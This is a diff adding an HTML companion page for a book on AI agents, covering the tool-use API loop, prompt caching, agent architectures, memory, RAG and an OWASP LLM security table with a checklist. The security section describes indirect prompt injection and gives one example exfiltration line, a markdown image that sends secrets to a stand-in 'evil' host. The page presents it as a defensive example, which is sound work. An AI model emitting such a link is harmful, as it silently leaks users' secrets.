@@ -1,0 +1,475 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>API &amp; Tooling Quick Reference · The Agentic Advantage · Elvin M. Peters</title>
+<meta name="description" content="API &amp; Tooling Quick Reference — companion resource for The Agentic Advantage, part of the AI Fluency series by Elvin M. Peters. Copy-and-adapt code, prompts and reference, kept current." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=EB+Garamond:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/resources.css" />
+</head>
+<body>
+<div class="topbar">
+  <a class="brand" href="/"><b>Elvin</b> M. Peters</a>
+  <div class="bookname">The Agentic Advantage &nbsp;·&nbsp; Companion Resources</div>
+  <a class="allbooks" href="/books/">← All my books</a>
+</div>
+<div class="mobar" id="mobar" onclick="toggleNav()"><span>Resources for this book</span><span class="chev">▾</span></div>
+<div class="shell">
+  <aside class="side" id="side">
+    <div class="kicker">AI Fluency · Volume 3</div>
+    <div class="booktitle">The Agentic Advantage</div>
+    <div class="navgroup"><h4>Start here</h4>
+      <a class="navlink" href="index.html"><span class="dot"></span>Resource home</a>
+      <a class="navlink" href="quick-reference-card.html"><span class="dot"></span>Quick Reference Card</a>
+    </div>
+    <div class="navgroup"><h4>Appendices</h4>
+      <a class="navlink" href="recipes.html"><span class="dot"></span>Agent Recipes &amp; Blueprints</a>
+      <a class="navlink" href="prompt-library.html"><span class="dot"></span>Prompt Library</a>
+      <a class="navlink" href="stack.html"><span class="dot"></span>The 2026 Operator Stack</a>
+      <a class="navlink" href="mcp.html"><span class="dot"></span>MCP Servers &amp; Integrations</a>
+      <a class="navlink active" href="api-reference.html"><span class="dot"></span>API &amp; Tooling Quick Reference</a>
+      <a class="navlink" href="glossary.html"><span class="dot"></span>Glossary</a>
+    </div>
+    <div class="navgroup"><h4>Chapter code</h4>
+      <a class="navlink" href="chapter-4.html"><span class="dot"></span>Ch 4 · Trigger-Action-Memory</a>
+      <a class="navlink" href="chapter-6.html"><span class="dot"></span>Ch 6 · Memory Architecture</a>
+      <a class="navlink" href="chapter-8.html"><span class="dot"></span>Ch 8 · The Monitoring Layer</a>
+      <a class="navlink" href="chapter-9.html"><span class="dot"></span>Ch 9 · Claude Code</a>
+      <a class="navlink" href="chapter-11.html"><span class="dot"></span>Ch 11 · The Tech Stack</a>
+      <a class="navlink" href="chapter-12.html"><span class="dot"></span>Ch 12 · Security &amp; Cost</a>
+    </div>
+  </aside>
+  <main class="main">
+    <div class="wrap">
+      <div class="crumb"><a href="index.html">The Agentic Advantage</a> &nbsp;/&nbsp; API &amp; Tooling Quick Reference</div>
+      <h1>API &amp; Tooling Quick Reference</h1>
+      <div class="updated"><span class="g"></span>Kept current · updated July 2026</div>
+      <p>I built this appendix as a lookup card rather than a chapter. When you are mid-build and you just need the shape of a <code class="inl">tool_choice</code> mode, the break-even math on prompt caching, or the one control that actually stops a given attack, flip here and scan. Every figure marked "at the time of writing" moves, so treat the numbers as shape rather than gospel; the live values sit in the companion Toolkit.</p>
+<hr/>
+<h2 class="rc">1. Tool Use: the Messages API loop</h2>
+<p>Claude emits <code class="inl">tool_use</code> blocks, your code runs them, you feed <code class="inl">tool_result</code> back, and you loop until <code class="inl">stop_reason</code> is <code class="inl">end_turn</code>. The Anthropic Messages API is the reference below; OpenAI (<code class="inl">tools</code>/<code class="inl">tool_calls</code>), Gemini (<code class="inl">functionDeclarations</code>), and Bedrock/Vertex mirror the same loop with renamed fields.</p>
+<h3 class="rc3">tool_choice modes</h3>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Behavior</th>
+<th>Reach for it when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code class="inl">{"type": "auto"}</code></td>
+<td>Default with tools present. Claude picks a tool or answers in text. Caps at one tool call per turn.</td>
+<td>You want free choice plus extended thinking.</td>
+</tr>
+<tr>
+<td><code class="inl">{"type": "any"}</code></td>
+<td>Claude must call some tool, never plain text. Forces exactly one.</td>
+<td>Every turn must produce an action.</td>
+</tr>
+<tr>
+<td><code class="inl">{"type": "tool", "name": "X"}</code></td>
+<td>Forces tool <code class="inl">X</code> specifically.</td>
+<td>Structured output via a forced schema tool.</td>
+</tr>
+<tr>
+<td><code class="inl">{"type": "none"}</code></td>
+<td>Forbids all tools this turn without removing the definitions.</td>
+<td>The final allowed loop turn, to force a text conclusion.</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Gotcha:</strong> <code class="inl">any</code> and <code class="inl">tool</code> are incompatible with extended thinking, because Claude cannot reason before a forced call. Use <code class="inl">auto</code> when you want thinking together with tools. Set <code class="inl">disable_parallel_tool_use: true</code> inside <code class="inl">tool_choice</code> to force serialization.</p>
+<h3 class="rc3">The loop (echo the assistant turn verbatim)</h3>
+<div class="code"><div class="bar"><span class="lang">python</span><button class="copy" onclick="copyCode(this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24"><rect height="13" rx="2" width="13" x="9" y="9"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy</button></div><pre><code class="language-python">import anthropic, json
+client = anthropic.Anthropic()
+MODEL = "claude-sonnet-4-5"  # verify current model IDs at write time
+
+messages = [{"role": "user", "content": "Weather in Toronto and Montreal?"}]
+MAX_ITERATIONS = 10
+
+for i in range(MAX_ITERATIONS):
+    resp = client.messages.create(
+        model=MODEL, max_tokens=1024, tools=tools, messages=messages,
+    )
+    messages.append({"role": "assistant", "content": resp.content})  # echo verbatim
+
+    if resp.stop_reason != "tool_use":
+        final = "".join(b.text for b in resp.content if b.type == "text")
+        break
+
+    tool_results = []
+    for block in resp.content:
+        if block.type == "tool_use":
+            try:
+                out = run_tool(block.name, block.input)
+                tool_results.append({
+                    "type": "tool_result", "tool_use_id": block.id,
+                    "content": out if isinstance(out, str) else json.dumps(out),
+                })
+            except Exception as e:
+                tool_results.append({
+                    "type": "tool_result", "tool_use_id": block.id,
+                    "content": f"Error: {e}", "is_error": True,
+                })
+    messages.append({"role": "user", "content": tool_results})
+</code></pre></div>
+<h3 class="rc3">Loop rules and gotchas</h3>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Rule</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Echo verbatim</strong></td>
+<td>Append the entire prior <code class="inl">assistant</code> turn (including <code class="inl">text</code> and <code class="inl">thinking</code> blocks) before your <code class="inl">tool_result</code> user turn, or you get a 400. Echo <code class="inl">response.content</code>; never hand-build the turn.</td>
+</tr>
+<tr>
+<td><strong>Filter by block type</strong></td>
+<td>With extended thinking on, <code class="inl">content[0]</code> may be a <code class="inl">thinking</code>/<code class="inl">redacted_thinking</code> block. <code class="inl">resp.content[0].text</code> crashes or grabs reasoning. Always filter <code class="inl">if block.type == "text"</code>. Preserve <code class="inl">thinking</code> blocks unmodified when echoing, or you break signature verification.</td>
+</tr>
+<tr>
+<td><strong>is_error</strong></td>
+<td>On a runtime or validation failure, set <code class="inl">"is_error": true</code> on the <code class="inl">tool_result</code> and put a short, actionable message in <code class="inl">content</code> ("City not found; provide a valid city"). Claude reads it and typically retries or asks the user. Do not throw your own stack unless the whole agent should die.</td>
+</tr>
+<tr>
+<td><strong>Loop cap</strong></td>
+<td>Always enforce a hard <code class="inl">max_iterations</code> counter in production and break gracefully. Optionally switch <code class="inl">tool_choice</code> to <code class="inl">"none"</code> on the final allowed turn to force a text conclusion. Budget total tokens and wall-clock too, and log every <code class="inl">tool_use</code>/<code class="inl">tool_result</code> pair for replay.</td>
+</tr>
+</tbody>
+</table></div>
+<h3 class="rc3">Parallel tool calls</h3>
+<p>One assistant turn can hold multiple <code class="inl">tool_use</code> blocks. "Toronto and Montreal" produces two <code class="inl">get_weather</code> blocks in a single turn. You must return <strong>all</strong> matching <code class="inl">tool_result</code> blocks in the next user turn, in one message. A missing <code class="inl">tool_use_id</code> is a 400. With <code class="inl">tool_choice.type == "auto"</code> Claude is capped at one call per turn; with <code class="inl">any</code> or <code class="inl">tool</code> it is forced to exactly one.</p>
+<h3 class="rc3">input_schema and cost</h3>
+<p>Claude only sees <code class="inl">name</code>, <code class="inl">description</code>, and <code class="inl">input_schema</code>, so this is the single biggest lever on reliability. Write descriptions like docstrings (what it does, when to use it, side effects), use <code class="inl">enum</code> to constrain, mark <code class="inl">required</code>, and flatten deep nesting. The field is <code class="inl">input_schema</code> (Anthropic), rather than <code class="inl">parameters</code> (OpenAI). All tool definitions serialize into the system prompt on <strong>every</strong> request, so treat 15 to 20 tools as a practical soft ceiling before routing to sub-agents or MCP. Cache them once the set is stable (see section 2).</p>
+<hr/>
+<h2 class="rc">2. Prompt-caching cheat-sheet</h2>
+<p>Caching is the highest-ROI cost optimization for an agent, because the loop re-sends a large, stable prefix (system prompt, tool definitions, retrieved docs, prior turns) on every iteration.</p>
+<h3 class="rc3">Break-even and rates</h3>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Provider</th>
+<th>Cache read</th>
+<th>Cache write</th>
+<th>Break-even</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Anthropic</strong></td>
+<td>~0.1x input price</td>
+<td>1.25x (5-min TTL) or 2x (1-hour TTL)</td>
+<td>2 requests at 5-min TTL, 3 at 1-hour</td>
+</tr>
+<tr>
+<td><strong>OpenAI</strong></td>
+<td>~0.1x (≈90% off)</td>
+<td>No write premium, automatic prefix caching (~1024-token min)</td>
+<td>Automatic</td>
+</tr>
+<tr>
+<td><strong>Gemini</strong></td>
+<td>~90% off cached context</td>
+<td>Implicit caching on newer models</td>
+<td>Automatic where offered</td>
+</tr>
+<tr>
+<td><strong>DeepSeek</strong></td>
+<td>Already cheap at list; live page shows <strong>no</strong> separate cache-hit discount</td>
+<td>n/a</td>
+<td>n/a</td>
+</tr>
+</tbody>
+</table></div>
+<p>Prices are approximate at the time of writing; confirm live numbers in the Toolkit. Do not cite a DeepSeek caching discount without re-checking the live page.</p>
+<h3 class="rc3">Add a breakpoint (Anthropic)</h3>
+<div class="code"><div class="bar"><span class="lang">python</span><button class="copy" onclick="copyCode(this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24"><rect height="13" rx="2" width="13" x="9" y="9"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy</button></div><pre><code class="language-python">tools[-1]["cache_control"] = {"type": "ephemeral"}  # caches all tool defs above it
+</code></pre></div>
+<p>Adding <code class="inl">cache_control</code> to the <strong>last</strong> tool definition caches the whole tools-plus-system block. Later turns within the TTL read cached tokens at roughly 10% of input price.</p>
+<h3 class="rc3">What silently invalidates a cache</h3>
+<p>Caching is a <strong>prefix match</strong>. Any byte change anywhere in the prefix invalidates everything after it. The classic silent killers:</p>
+<ul>
+<li>A <code class="inl">datetime.now()</code> or UUID interpolated into the system prompt.</li>
+<li>Non-deterministic JSON serialization (unsorted keys).</li>
+<li>Changing the tool set mid-conversation.</li>
+</ul>
+<p>Keep the system prompt frozen, serialize tools deterministically, and put volatile content <strong>after</strong> the last cache breakpoint. Verify with <code class="inl">cache_read_input_tokens</code>; if it is zero across identical-prefix requests, you have a silent invalidator.</p>
+<h3 class="rc3">Batch discount</h3>
+<p>Every major provider offers <strong>50% off both input and output</strong> for asynchronous jobs with a 24-hour SLA (Anthropic Message Batches, OpenAI Batch, Google Batch). Use it for anything not blocking a user: nightly evals, bulk classification and extraction, synthetic data, backfills, LLM-judge grading, embedding large corpora. A workhorse-tier workload that is cached <strong>and</strong> batched can land near lightweight-tier list price while keeping workhorse quality, roughly a 95% reduction versus naive per-request frontier calls. The tradeoff is latency, so treat batch as a throughput tool rather than a request/response tool.</p>
+<h3 class="rc3">Cascade vs router</h3>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>How it works</th>
+<th>Watch out for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Cascade</strong></td>
+<td>Run the cheapest model first; escalate only when a confidence signal fails (self-reported low confidence, a validator/schema failure, a grounding check, or a cheap judge scoring below threshold). Well-tuned, it cuts spend 50 to 80% with negligible quality loss.</td>
+<td>The <strong>escalation tax</strong>: escalating on 40% of traffic pays for both the cheap and the frontier call on those. Tune the threshold against measured escalation rate.</td>
+</tr>
+<tr>
+<td><strong>Router</strong></td>
+<td>A tiny classifier (lightweight tier) tags each request by difficulty/domain and dispatches to the right tier directly, avoiding the double-inference cost of a cascade on hard requests.</td>
+<td>Misroutes are silent and expensive downstream. Add a fallback route and log it.</td>
+</tr>
+</tbody>
+</table></div>
+<p>Route by <strong>task</strong> rather than globally: the planner can be frontier while workers cascade.</p>
+<h3 class="rc3">Token budgeting for agent loops</h3>
+<p>The dominant cost is the <strong>re-sent context growing every turn</strong>, which dwarfs the final answer. A 20-turn loop with a 50K-token accumulated context re-sends roughly 1M input tokens total even when each turn's new output is tiny.</p>
+<ul>
+<li><strong>Caching is mandatory</strong> for any loop beyond a few turns.</li>
+<li><strong>Cap the loop.</strong> Use provider task budgets (a token ceiling the model paces against, distinct from <code class="inl">max_tokens</code> which is a hard cutoff) or your own <code class="inl">max_iterations</code> guard.</li>
+<li><strong>Prune and compact.</strong> Context editing (clear stale tool results) and compaction (summarize old turns) keep the re-sent prefix from ballooning.</li>
+<li><strong>Right-size effort.</strong> On current reasoning models, <code class="inl">low</code>/<code class="inl">medium</code> often matches last-generation <code class="inl">high</code>. Sweep effort on your eval set rather than trusting carried-over defaults.</li>
+</ul>
+<hr/>
+<h2 class="rc">3. Which agent architecture when (decision list)</h2>
+<p>Prefer a <strong>workflow</strong> (fixed code paths with LLM calls at defined steps) and graduate to an autonomous agent only when the task genuinely needs dynamic control flow. Complexity is a cost you pay in latency, tokens, and failure modes, so buy it only when the task requires it.</p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>If the task is...</th>
+<th>Use...</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Steps are known and fixed</td>
+<td><strong>Workflow</strong> (prompt chaining / code), rather than an agent</td>
+</tr>
+<tr>
+<td>Input type varies, treatments differ</td>
+<td><strong>Router</strong>, optionally in front of anything below</td>
+</tr>
+<tr>
+<td>Open-ended, next step depends on observations</td>
+<td><strong>Core loop / ReAct</strong> (the default)</td>
+</tr>
+<tr>
+<td>Structured, multi-step, parallelizable, want plan approval or cheaper execution</td>
+<td><strong>Plan-and-execute</strong> with re-planning</td>
+</tr>
+<tr>
+<td>Output is checkable and iteration helps (tests / rubric / verifier)</td>
+<td><strong>Reflection / evaluator-optimizer</strong></td>
+</tr>
+<tr>
+<td>Retryable task with a reward signal, multiple attempts allowed</td>
+<td><strong>Reflexion</strong> (cross-episode memory)</td>
+</tr>
+<tr>
+<td>Breadth-heavy, parallelizable, exceeds one context window</td>
+<td><strong>Orchestrator-worker multi-agent</strong></td>
+</tr>
+<tr>
+<td>Genuine combinatorial search with verifiable states</td>
+<td><strong>Tree-of-Thoughts / search</strong>; first try <strong>self-consistency</strong> or <strong>best-of-N + verifier</strong> (usually enough, far cheaper)</td>
+</tr>
+<tr>
+<td>In doubt</td>
+<td>Start with <strong>ReAct + strong tools + a verification gate</strong>; add reflection or sub-agents only where measurement shows a gap</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Cost and latency rise sharply down the list:</strong> workflow &lt; ReAct &lt; reflection (×rounds) &lt; plan-execute &lt; multi-agent (×sub-agents) &lt; ToT (×branches). Reliability is non-monotonic in complexity: more agents and deeper search add coordination and compounding-error risk. Reliability comes from grounding in real feedback, bounded loops, context management, and verification gates, rather than from the fanciness of the reasoning pattern.</p>
+<hr/>
+<h2 class="rc">4. The four types of agent memory</h2>
+<p>Treat the context window as a scarce, curated resource. Roughly 65% of enterprise agent failures in 2025 traced to context rot or memory loss during multi-step reasoning, rather than raw window overflow. The best agents combine all four types below.</p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>What it is</th>
+<th>Use for</th>
+<th>Gotcha</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>In-context (working memory)</strong></td>
+<td>What the model holds right now: system prompt, recent turns, scratchpad</td>
+<td>The immediate task; fastest, zero-latency</td>
+<td>Volatile and token-expensive; padding with "just in case" context measurably degrades output (lost-in-the-middle)</td>
+</tr>
+<tr>
+<td><strong>External files / state</strong></td>
+<td>Durable working memory on disk: JSON state blobs, append-only logs, a <code class="inl">SESSION_STATUS.md</code>-style doc</td>
+<td>Cross-session continuity and human-auditable state</td>
+<td>Files silently drift from reality if updated lazily; enforce writes with a stop-hook rather than good intentions</td>
+</tr>
+<tr>
+<td><strong>Vector / semantic</strong></td>
+<td>Embeddings in a vector DB for fuzzy "what's relevant to this query" recall</td>
+<td>Knowledge bases, docs, past-conversation recall at scale</td>
+<td>Semantic similarity is not relevance; without re-ranking you retrieve plausible-but-wrong chunks</td>
+</tr>
+<tr>
+<td><strong>Structured DB</strong></td>
+<td>SQL/graph rows with exact schema: profiles, entities, facts, task queues</td>
+<td>Precise filtering, joins, transactional updates, auditability</td>
+<td>The model must know the schema; expose it as a tool rather than raw SQL access</td>
+</tr>
+</tbody>
+</table></div>
+<p>The through-line: retrieval is not memory. Memory is the system: what gets written, when it is compacted, what is authoritative, and how the agent decides what to pull into a deliberately small window. Model the write path and the eviction policy as carefully as the read path.</p>
+<hr/>
+<h2 class="rc">5. The 2026 RAG pipeline</h2>
+<p>RAG is the answer whenever your source of truth changes and must be attributable. The consensus pipeline:</p>
+<p><strong>query → (optional) query rewrite → hybrid retrieval (dense top-N + BM25 top-N, fused via Reciprocal Rank Fusion) → re-rank (cross-encoder) → top 5-8 → context builder → LLM</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>What to do</th>
+<th>Gotcha</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Chunking</strong> (highest-leverage lever)</td>
+<td>Prefer semantic chunking (break where cosine distance between adjacent sentences spikes) or parent-child / small-to-big (embed small chunks for precise matching, feed the parent section to the LLM)</td>
+<td>Fixed 512-token chunks split tables, code, and clauses mid-thought; bad chunking guarantees failure even with strong embeddings</td>
+</tr>
+<tr>
+<td><strong>Embeddings</strong></td>
+<td>Use a current model (Voyage, OpenAI <code class="inl">text-embedding-3</code>, Cohere Embed, or open <code class="inl">bge</code>/<code class="inl">e5</code>); match model to domain</td>
+<td>Test recall rather than assuming</td>
+</tr>
+<tr>
+<td><strong>Hybrid search</strong></td>
+<td>Dense (semantic) + sparse BM25 (exact terms, IDs, rare tokens) fused with weighted RRF</td>
+<td>Dense alone misses literal matches like error codes and SKUs</td>
+</tr>
+<tr>
+<td><strong>Re-ranking</strong></td>
+<td>Retrieve ~20 to 100 candidates, re-rank with a cross-encoder (Cohere Rerank 3.5, Voyage rerank, or FlashRank locally) to top 5-8</td>
+<td>20 to 5 is the sweet spot; re-ranking 100+ candidates rarely pays off</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>RAG vs long-context vs fine-tune:</strong> use RAG when the corpus is large, changing, or needs citations. Use fine-tuning to teach behavior, format, or tone rather than facts. Use long-context (or Cache-Augmented Generation) when the corpus is small and stable enough to fit the window.</p>
+<hr/>
+<h2 class="rc">6. OWASP LLM Top-10, agent manifestation, and the primary control</h2>
+<p>An agent acts, so security is about constraining the blast radius of a compromised reasoning loop. Treat the model as a permanently untrusted, occasionally-hijacked component and engineer around it. There is still no model-level fix for prompt injection; assume it will succeed sometimes and make sure the permission layer bounds the damage.</p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>OWASP 2025</th>
+<th>Agent-specific manifestation</th>
+<th>Primary control</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>LLM01 Prompt Injection</strong></td>
+<td>Indirect injection via tool / RAG / email output</td>
+<td>Dual-LLM / CaMeL, taint tracking, allowlists</td>
+</tr>
+<tr>
+<td><strong>LLM02 Sensitive Info Disclosure</strong></td>
+<td>Exfiltration via legitimate tools / URLs</td>
+<td>Egress allowlist, no secrets in context</td>
+</tr>
+<tr>
+<td><strong>LLM03 Supply Chain</strong></td>
+<td>Poisoned or rug-pulled MCP servers and tools</td>
+<td>Pin and diff definitions, sandbox, vet sources</td>
+</tr>
+<tr>
+<td><strong>LLM04 Data/Model Poisoning</strong></td>
+<td>Corrupted RAG corpus</td>
+<td>Provenance, source integrity</td>
+</tr>
+<tr>
+<td><strong>LLM05 Improper Output Handling</strong></td>
+<td>LLM output flows into a shell / SQL / DOM sink</td>
+<td>Validate and escape at every sink</td>
+</tr>
+<tr>
+<td><strong>LLM06 Excessive Agency</strong></td>
+<td>God-tools, borrowed admin token</td>
+<td>Least privilege, scoped agent identity</td>
+</tr>
+<tr>
+<td><strong>LLM07 System Prompt Leakage</strong></td>
+<td>Extracted prompt reveals secrets or logic</td>
+<td>Keep secrets out of the prompt entirely</td>
+</tr>
+<tr>
+<td><strong>LLM08 Vector/Embedding Weaknesses</strong></td>
+<td>Cross-tenant RAG leakage</td>
+<td>Namespace isolation, retrieval ACLs</td>
+</tr>
+<tr>
+<td><strong>LLM09 Misinformation</strong></td>
+<td>Fabrication drives a bad action</td>
+<td>Grounding, human-in-the-loop on high-stakes</td>
+</tr>
+<tr>
+<td><strong>LLM10 Unbounded Consumption</strong></td>
+<td>Runaway loops, recursive spawns</td>
+<td>Iteration and budget caps, kill switch</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Injection defenses, strongest to weakest:</strong> dual-LLM / quarantine (CaMeL) with provenance/taint tracking and capability-gated tool calls; allowlists and structural separation of untrusted content; taint tracking that forbids high-privilege calls whose arguments derive from tainted data. Exfiltration rides legitimate channels, so a markdown image such as <code class="inl">![](https://evil/?d=&lt;secrets&gt;)</code> is a silent GET; sanitize rendered output and constrain outbound egress at the sandbox level.</p>
+<hr/>
+<h2 class="rc">7. Operator security checklist</h2>
+<ul>
+<li>[ ] <strong>Identity:</strong> the agent runs under its own scoped service identity, never a borrowed admin or user token.</li>
+<li>[ ] <strong>Least privilege:</strong> every tool scoped to the narrowest capability; read-only by default; no god-tools. Prefer many narrow tools and enumerated destructive operations over one tool that composes arbitrary SQL or shell.</li>
+<li>[ ] <strong>Trust boundary:</strong> untrusted content (web, RAG, email, tool output, MCP descriptions) is delimited and taint-tracked; high-privilege calls with tainted arguments are blocked.</li>
+<li>[ ] <strong>HITL gates:</strong> irreversible actions (pay, send, post, deploy, delete) require human confirmation showing resolved payload values rather than the model's summary. Gate only the irreversible set so approvals stay real.</li>
+<li>[ ] <strong>Secrets:</strong> in vault or env only; injected at the tool boundary so the model sees handles rather than values; rotated on schedule and on suspected leak; never in prompts, traces, or logs.</li>
+<li>[ ] <strong>Sandbox:</strong> code execution in ephemeral, non-root, network-deny-by-default containers or microVMs with CPU, memory, and wall-clock limits.</li>
+<li>[ ] <strong>Egress control:</strong> outbound destinations allowlisted; block recipients and URLs sourced from untrusted content; no data in query strings.</li>
+<li>[ ] <strong>Runaway controls:</strong> per-run caps on iterations, tool calls, wall-clock, and dollars (counting retries and sub-agents); loop detection; concurrency limit; operator kill switch.</li>
+<li>[ ] <strong>Output handling:</strong> validate and escape every LLM output before it reaches a shell, query, browser, or renderer.</li>
+<li>[ ] <strong>Supply chain:</strong> pin and diff tool and MCP definitions each load; sandbox each server; vet or self-host; pin package versions.</li>
+<li>[ ] <strong>Audit:</strong> immutable, redacted, queryable logs of prompts, context (with trust labels), tool calls, decisions, approvals, and cost.</li>
+<li>[ ] <strong>Assume breach:</strong> design so a successful injection is bounded by the permission layer rather than the prompt; red-team with AgentDojo-style indirect-injection suites before shipping.</li>
+</ul>
+      <div class="optin">
+        <h3>Want the whole library, kept current?</h3>
+        <p>Every recipe, prompt, and worksheet across the series, plus a note whenever a model or price changes. No spam, unsubscribe anytime.</p>
+        <form onsubmit="return optin(event)">
+          <input type="email" placeholder="you@example.com" aria-label="Email address" required />
+          <button type="submit">Send me the library</button>
+        </form>
+      </div>
+      <footer class="pfoot">
+        <a href="index.html">All The Agentic Advantage resources</a> &nbsp;·&nbsp;
+        <a href="/books/">Other books</a> &nbsp;·&nbsp;
+        <a href="/">elvinpeters.com</a>
+      </footer>
+    </div>
+  </main>
+</div>
+<script>
+function copyCode(btn){
+  var code = btn.closest('.code').querySelector('pre code, pre').innerText;
+  navigator.clipboard.writeText(code).then(function(){
+    var o=btn.innerHTML; btn.classList.add('done');
+    btn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6 9 17l-5-5"/></svg> Copied';
+    setTimeout(function(){btn.classList.remove('done');btn.innerHTML=o;},1600);
+  });
+}
+function toggleNav(){document.getElementById('side').classList.toggle('open');document.getElementById('mobar').classList.toggle('open');}
+function optin(e){e.preventDefault();e.target.querySelector('button').textContent='Thanks — check your inbox';return false;}
+
+</script>
+</body>
+</html>
